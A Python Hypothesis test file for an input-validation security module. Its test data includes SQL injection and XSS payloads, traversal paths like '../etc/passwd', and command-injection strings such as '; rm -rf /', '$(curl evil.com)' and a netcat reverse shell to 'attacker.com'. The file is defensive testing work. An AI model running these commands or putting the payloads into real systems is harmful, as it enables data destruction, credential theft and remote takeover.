"""
Property-based tests for Input Validation.

These tests use Hypothesis to verify that all user input is properly validated
and sanitized before use across many randomly generated inputs.

Feature: sdlc-kit-improvements
Property 14: Input Validation
Requirements: 14.7
"""

import pytest
from hypothesis import given, strategies as st, settings, assume
from typing import Optional

from security.validators import (
    sanitize_sql,
    sanitize_xss,
    sanitize_command,
    validate_email,
    validate_url,
    validate_length,
    validate_alphanumeric,
    validate_filename,
    validate_integer,
    sanitize_input,
    ValidationError
)


# Strategy for generating potentially dangerous SQL inputs
sql_injection_patterns = st.sampled_from([
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM passwords--",
    "1; DELETE FROM users WHERE 1=1",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",
])

# Strategy for generating potentially dangerous XSS inputs
xss_patterns = st.sampled_from([
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<svg onload=alert('XSS')>",
])

# Strategy for generating potentially dangerous command injection inputs
command_injection_patterns = st.sampled_from([
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& whoami",
    "`cat /etc/shadow`",
    "$(curl evil.com)",
    "; nc -e /bin/sh attacker.com 4444",
])

# Strategy for generating safe text inputs
safe_text = st.text(
    alphabet=st.characters(whitelist_categories=('Lu', 'Ll', 'Nd'), min_codepoint=65, max_codepoint=122),
    min_size=1,
    max_size=100
).filter(lambda x: x and x.strip())

# Strategy for generating email addresses
emails = st.from_regex(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', fullmatch=True)

# Strategy for generating URLs
urls = st.sampled_from([
    "http://example.com",
    "https://example.com/path",
    "https://example.com/path?query=value",
    "http://subdomain.example.com:8080/path",
])

# Strategy for generating filenames
filenames = st.text(
    alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-',
    min_size=1,
    max_size=50
).filter(lambda x: x and x[0].isalnum() and '..' not in x and '/' not in x and '\\' not in x)


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(dangerous_input=sql_injection_patterns)
@settings(max_examples=10, deadline=None)
def test_sql_injection_sanitization(dangerous_input):
    """
    Property: For any input containing SQL injection patterns, when processed
    through the Security_Module's SQL sanitizer, the output should not contain
    dangerous SQL keywords or characters.
    
    This property ensures that SQL injection attacks are prevented.
    
    **Validates: Requirements 14.7**
    """
    # Sanitize the input
    sanitized = sanitize_sql(dangerous_input)
    
    # Property: Sanitized output should not contain dangerous SQL keywords
    dangerous_keywords = ['DROP', 'DELETE', 'INSERT', 'UPDATE', 'EXEC', 'UNION', 'SELECT']
    for keyword in dangerous_keywords:
        assert keyword.upper() not in sanitized.upper(), (
            f"Sanitized output should not contain SQL keyword '{keyword}'"
        )
    
    # Property: Sanitized output should not contain SQL comment markers
    assert '--' not in sanitized, "Sanitized output should not contain SQL comments"
    
    # Property: Sanitized output should not contain statement separators
    assert ';' not in sanitized, "Sanitized output should not contain statement separators"
    
    # Property: Sanitized output should not contain quote characters
    assert "'" not in sanitized, "Sanitized output should not contain single quotes"
    assert '"' not in sanitized, "Sanitized output should not contain double quotes"


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(dangerous_input=xss_patterns)
@settings(max_examples=10, deadline=None)
def test_xss_sanitization(dangerous_input):
    """
    Property: For any input containing XSS attack patterns, when processed
    through the Security_Module's XSS sanitizer, the output should not contain
    executable script tags or event handlers.
    
    This property ensures that XSS attacks are prevented.
    
    **Validates: Requirements 14.7**
    """
    # Sanitize the input
    sanitized = sanitize_xss(dangerous_input)
    
    # Property: Sanitized output should not contain script tags
    assert '<script' not in sanitized.lower(), (
        "Sanitized output should not contain script tags"
    )
    assert '</script>' not in sanitized.lower(), (
        "Sanitized output should not contain closing script tags"
    )
    
    # Property: Sanitized output should not contain javascript: protocol
    assert 'javascript:' not in sanitized.lower(), (
        "Sanitized output should not contain javascript: protocol"
    )
    
    # Property: Sanitized output should not contain event handlers
    event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover']
    for handler in event_handlers:
        assert handler not in sanitized.lower(), (
            f"Sanitized output should not contain event handler '{handler}'"
        )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(dangerous_input=command_injection_patterns)
@settings(max_examples=10, deadline=None)
def test_command_injection_sanitization(dangerous_input):
    """
    Property: For any input containing command injection patterns, when
    processed through the Security_Module's command sanitizer, the output
    should not contain shell metacharacters or command separators.
    
    This property ensures that command injection attacks are prevented.
    
    **Validates: Requirements 14.7**
    """
    # Sanitize the input
    sanitized = sanitize_command(dangerous_input)
    
    # Property: Sanitized output should not contain command separators
    dangerous_chars = [';', '&', '|', '>', '<', '`', '$', '(', ')', '{', '}', '[', ']']
    for char in dangerous_chars:
        assert char not in sanitized, (
            f"Sanitized output should not contain dangerous character '{char}'"
        )
    
    # Property: Sanitized output should not contain newlines
    assert '\n' not in sanitized, "Sanitized output should not contain newlines"
    assert '\r' not in sanitized, "Sanitized output should not contain carriage returns"


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(email=emails)
@settings(max_examples=10, deadline=None)
def test_valid_email_validation(email):
    """
    Property: For any valid email address, when validated through the
    Security_Module, the validation should return True.
    
    This property ensures that valid emails are accepted.
    
    **Validates: Requirements 14.7**
    """
    # Validate the email
    is_valid = validate_email(email)
    
    # Property: Valid email should pass validation
    assert is_valid is True, f"Valid email '{email}' should pass validation"


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    invalid_email=st.one_of(
        st.text(min_size=1, max_size=50).filter(lambda x: '@' not in x),
        st.text(min_size=1, max_size=50).filter(lambda x: x.count('@') > 1),
        st.from_regex(r'^[^@]+@[^.]+$', fullmatch=True),  # Missing TLD
    )
)
@settings(max_examples=10, deadline=None)
def test_invalid_email_validation(invalid_email):
    """
    Property: For any invalid email address, when validated through the
    Security_Module, the validation should return False.
    
    This property ensures that invalid emails are rejected.
    
    **Validates: Requirements 14.7**
    """
    # Validate the email
    is_valid = validate_email(invalid_email)
    
    # Property: Invalid email should fail validation
    assert is_valid is False, f"Invalid email '{invalid_email}' should fail validation"



# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(url=urls)
@settings(max_examples=10, deadline=None)
def test_valid_url_validation(url):
    """
    Property: For any valid URL with http or https scheme, when validated
    through the Security_Module, the validation should return True.
    
    This property ensures that valid URLs are accepted.
    
    **Validates: Requirements 14.7**
    """
    # Validate the URL
    is_valid = validate_url(url)
    
    # Property: Valid URL should pass validation
    assert is_valid is True, f"Valid URL '{url}' should pass validation"


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    text=safe_text,
    min_len=st.integers(min_value=1, max_value=50),
    max_len=st.integers(min_value=51, max_value=200)
)
@settings(max_examples=10, deadline=None)
def test_length_validation_within_bounds(text, min_len, max_len):
    """
    Property: For any text input within specified length bounds, when
    validated through the Security_Module, the validation should return True.
    
    This property ensures that inputs within length constraints are accepted.
    
    **Validates: Requirements 14.7**
    """
    # Adjust text to be within bounds
    if len(text) < min_len:
        text = text + 'a' * (min_len - len(text))
    if len(text) > max_len:
        text = text[:max_len]
    
    # Validate the length
    try:
        is_valid = validate_length(text, min_length=min_len, max_length=max_len)
        # Property: Text within bounds should pass validation
        assert is_valid is True, (
            f"Text of length {len(text)} should pass validation "
            f"(min: {min_len}, max: {max_len})"
        )
    except ValidationError:
        pytest.fail(f"Text within bounds should not raise ValidationError")


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    text=st.text(min_size=1, max_size=10),
    min_len=st.integers(min_value=20, max_value=50)
)
@settings(max_examples=10, deadline=None)
def test_length_validation_too_short(text, min_len):
    """
    Property: For any text input shorter than the minimum length, when
    validated through the Security_Module, the validation should raise
    ValidationError with a descriptive message.
    
    This property ensures that inputs below minimum length are rejected.
    
    **Validates: Requirements 14.7**
    """
    # Ensure text is shorter than minimum
    assume(len(text) < min_len)
    
    # Validate the length
    with pytest.raises(ValidationError) as exc_info:
        validate_length(text, min_length=min_len)
    
    # Property: Error message should mention "too short" or "minimum"
    error_message = str(exc_info.value).lower()
    assert 'short' in error_message or 'minimum' in error_message, (
        "Error message should indicate input is too short"
    )
    
    # Property: Error message should include the actual and expected lengths
    assert str(len(text)) in str(exc_info.value), (
        "Error message should include actual length"
    )
    assert str(min_len) in str(exc_info.value), (
        "Error message should include minimum length"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    text=st.text(min_size=100, max_size=200),
    max_len=st.integers(min_value=10, max_value=50)
)
@settings(max_examples=10, deadline=None)
def test_length_validation_too_long(text, max_len):
    """
    Property: For any text input longer than the maximum length, when
    validated through the Security_Module, the validation should raise
    ValidationError with a descriptive message.
    
    This property ensures that inputs above maximum length are rejected.
    
    **Validates: Requirements 14.7**
    """
    # Ensure text is longer than maximum
    assume(len(text) > max_len)
    
    # Validate the length
    with pytest.raises(ValidationError) as exc_info:
        validate_length(text, max_length=max_len)
    
    # Property: Error message should mention "too long" or "maximum"
    error_message = str(exc_info.value).lower()
    assert 'long' in error_message or 'maximum' in error_message, (
        "Error message should indicate input is too long"
    )
    
    # Property: Error message should include the actual and expected lengths
    assert str(len(text)) in str(exc_info.value), (
        "Error message should include actual length"
    )
    assert str(max_len) in str(exc_info.value), (
        "Error message should include maximum length"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    alphanumeric_text=st.text(
        alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
        min_size=1,
        max_size=50
    )
)
@settings(max_examples=10, deadline=None)
def test_alphanumeric_validation_valid(alphanumeric_text):
    """
    Property: For any text containing only alphanumeric characters, when
    validated through the Security_Module, the validation should return True.
    
    This property ensures that valid alphanumeric inputs are accepted.
    
    **Validates: Requirements 14.7**
    """
    # Validate alphanumeric
    try:
        is_valid = validate_alphanumeric(alphanumeric_text, allow_spaces=False)
        # Property: Alphanumeric text should pass validation
        assert is_valid is True, (
            f"Alphanumeric text '{alphanumeric_text}' should pass validation"
        )
    except ValidationError:
        pytest.fail(f"Alphanumeric text should not raise ValidationError")


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    text_with_special_chars=st.text(
        alphabet=st.characters(blacklist_categories=('Lu', 'Ll', 'Nd', 'Zs')),
        min_size=1,
        max_size=50
    ).filter(lambda x: x and any(not c.isalnum() and not c.isspace() for c in x))
)
@settings(max_examples=10, deadline=None)
def test_alphanumeric_validation_invalid(text_with_special_chars):
    """
    Property: For any text containing special characters, when validated
    through the Security_Module with alphanumeric validation, the validation
    should raise ValidationError.
    
    This property ensures that non-alphanumeric inputs are rejected.
    
    **Validates: Requirements 14.7**
    """
    # Validate alphanumeric
    with pytest.raises(ValidationError) as exc_info:
        validate_alphanumeric(text_with_special_chars, allow_spaces=False)
    
    # Property: Error message should mention invalid characters
    error_message = str(exc_info.value).lower()
    assert 'invalid' in error_message or 'alphanumeric' in error_message, (
        "Error message should indicate invalid characters"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(filename=filenames)
@settings(max_examples=10, deadline=None)
def test_filename_validation_valid(filename):
    """
    Property: For any valid filename without directory traversal patterns,
    when validated through the Security_Module, the validation should
    return True.
    
    This property ensures that safe filenames are accepted.
    
    **Validates: Requirements 14.7**
    """
    # Validate filename
    try:
        is_valid = validate_filename(filename)
        # Property: Valid filename should pass validation
        assert is_valid is True, f"Valid filename '{filename}' should pass validation"
    except ValidationError:
        pytest.fail(f"Valid filename should not raise ValidationError")


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    dangerous_filename=st.sampled_from([
        "../etc/passwd",
        "../../secret.txt",
        "file/../../../root",
        "file/with/slash.txt",
        "file\\with\\backslash.txt",
        "file\x00null.txt",
    ])
)
@settings(max_examples=10, deadline=None)
def test_filename_validation_directory_traversal(dangerous_filename):
    """
    Property: For any filename containing directory traversal patterns,
    when validated through the Security_Module, the validation should
    raise ValidationError.
    
    This property ensures that directory traversal attacks are prevented.
    
    **Validates: Requirements 14.7**
    """
    # Validate filename
    with pytest.raises(ValidationError) as exc_info:
        validate_filename(dangerous_filename)
    
    # Property: Error message should mention dangerous pattern or invalid filename
    error_message = str(exc_info.value).lower()
    assert 'dangerous' in error_message or 'invalid' in error_message, (
        "Error message should indicate dangerous or invalid filename"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    int_str=st.integers(min_value=-1000, max_value=1000).map(str)
)
@settings(max_examples=10, deadline=None)
def test_integer_validation_valid(int_str):
    """
    Property: For any valid integer string, when validated through the
    Security_Module, the validation should return the integer value.
    
    This property ensures that valid integers are accepted and converted.
    
    **Validates: Requirements 14.7**
    """
    # Validate integer
    try:
        result = validate_integer(int_str)
        # Property: Result should be an integer
        assert isinstance(result, int), "Result should be an integer"
        # Property: Result should match the original value
        assert result == int(int_str), "Result should match original value"
    except ValidationError:
        pytest.fail(f"Valid integer string should not raise ValidationError")


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    non_int_str=st.text(min_size=1, max_size=20).filter(
        lambda x: not x.lstrip('-').isdigit()
    )
)
@settings(max_examples=10, deadline=None)
def test_integer_validation_invalid(non_int_str):
    """
    Property: For any non-integer string, when validated through the
    Security_Module, the validation should raise ValidationError.
    
    This property ensures that non-integer inputs are rejected.
    
    **Validates: Requirements 14.7**
    """
    # Validate integer
    with pytest.raises(ValidationError) as exc_info:
        validate_integer(non_int_str)
    
    # Property: Error message should mention invalid integer
    error_message = str(exc_info.value).lower()
    assert 'invalid' in error_message or 'integer' in error_message, (
        "Error message should indicate invalid integer"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    int_value=st.integers(min_value=100, max_value=1000),
    max_value=st.integers(min_value=10, max_value=50)
)
@settings(max_examples=10, deadline=None)
def test_integer_validation_out_of_range(int_value, max_value):
    """
    Property: For any integer value outside the specified range, when
    validated through the Security_Module, the validation should raise
    ValidationError with a descriptive message.
    
    This property ensures that out-of-range integers are rejected.
    
    **Validates: Requirements 14.7**
    """
    # Ensure value is out of range
    assume(int_value > max_value)
    
    # Validate integer with range
    with pytest.raises(ValidationError) as exc_info:
        validate_integer(str(int_value), max_value=max_value)
    
    # Property: Error message should mention the range violation
    error_message = str(exc_info.value).lower()
    assert 'large' in error_message or 'maximum' in error_message, (
        "Error message should indicate value is too large"
    )
    
    # Property: Error message should include the actual and expected values
    assert str(int_value) in str(exc_info.value), (
        "Error message should include actual value"
    )
    assert str(max_value) in str(exc_info.value), (
        "Error message should include maximum value"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    user_input=st.text(min_size=1, max_size=100),
    sanitize_sql_flag=st.booleans(),
    sanitize_xss_flag=st.booleans(),
    sanitize_cmd_flag=st.booleans()
)
@settings(max_examples=10, deadline=None)
def test_combined_sanitization(user_input, sanitize_sql_flag, sanitize_xss_flag, sanitize_cmd_flag):
    """
    Property: For any user input, when processed through the Security_Module's
    combined sanitization function with specified flags, the output should
    be sanitized according to the enabled sanitization methods.
    
    This property ensures that multiple sanitization methods can be applied
    together correctly.
    
    **Validates: Requirements 14.7**
    """
    # Apply combined sanitization
    try:
        sanitized = sanitize_input(
            user_input,
            sanitize_sql_injection=sanitize_sql_flag,
            sanitize_xss_attack=sanitize_xss_flag,
            sanitize_command_injection=sanitize_cmd_flag
        )
        
        # Property: Sanitized output should be a string
        assert isinstance(sanitized, str), "Sanitized output should be a string"
        
        # Property: If SQL sanitization is enabled, output should not contain SQL keywords
        if sanitize_sql_flag and any(kw in user_input.upper() for kw in ['DROP', 'DELETE', 'SELECT']):
            dangerous_keywords = ['DROP', 'DELETE', 'SELECT']
            for keyword in dangerous_keywords:
                assert keyword.upper() not in sanitized.upper(), (
                    f"SQL-sanitized output should not contain '{keyword}'"
                )
        
        # Property: If XSS sanitization is enabled, output should not contain script tags
        if sanitize_xss_flag and '<script' in user_input.lower():
            assert '<script' not in sanitized.lower(), (
                "XSS-sanitized output should not contain script tags"
            )
        
        # Property: If command sanitization is enabled, output should not contain shell metacharacters
        if sanitize_cmd_flag and any(c in user_input for c in [';', '|', '&']):
            dangerous_chars = [';', '|', '&']
            for char in dangerous_chars:
                assert char not in sanitized, (
                    f"Command-sanitized output should not contain '{char}'"
                )
    except ValidationError:
        # ValidationError is acceptable for invalid input types
        pass


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    input_value=st.one_of(
        st.integers(),
        st.floats(allow_nan=False, allow_infinity=False),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text())
    )
)
@settings(max_examples=10, deadline=None)
def test_type_validation_non_string(input_value):
    """
    Property: For any non-string input, when validated through the
    Security_Module's string validators, the validation should raise
    ValidationError indicating type mismatch.
    
    This property ensures that type validation is enforced.
    
    **Validates: Requirements 14.7**
    """
    # Try to sanitize non-string input
    with pytest.raises(ValidationError) as exc_info:
        sanitize_sql(input_value)
    
    # Property: Error message should mention expected type
    error_message = str(exc_info.value).lower()
    assert 'string' in error_message or 'expected' in error_message, (
        "Error message should indicate expected type"
    )


# Feature: sdlc-kit-improvements, Property 14: Input Validation
@given(
    safe_input=safe_text
)
@settings(max_examples=10, deadline=None)
def test_sanitization_preserves_safe_input(safe_input):
    """
    Property: For any safe input without dangerous patterns, when processed
    through the Security_Module's sanitizers, the output should be similar
    to the input (allowing for minor transformations like trimming).
    
    This property ensures that sanitization doesn't unnecessarily modify
    safe inputs.
    
    **Validates: Requirements 14.7**
    """
    # Sanitize safe input
    sql_sanitized = sanitize_sql(safe_input)
    xss_sanitized = sanitize_xss(safe_input)
    cmd_sanitized = sanitize_command(safe_input)
    
    # Property: Sanitized outputs should not be empty if input wasn't empty
    if safe_input.strip():
        assert sql_sanitized or xss_sanitized or cmd_sanitized, (
            "Sanitized output should not be empty for non-empty safe input"
        )
    
    # Property: Sanitized outputs should be strings
    assert isinstance(sql_sanitized, str), "SQL sanitized output should be a string"
    assert isinstance(xss_sanitized, str), "XSS sanitized output should be a string"
    assert isinstance(cmd_sanitized, str), "Command sanitized output should be a string"
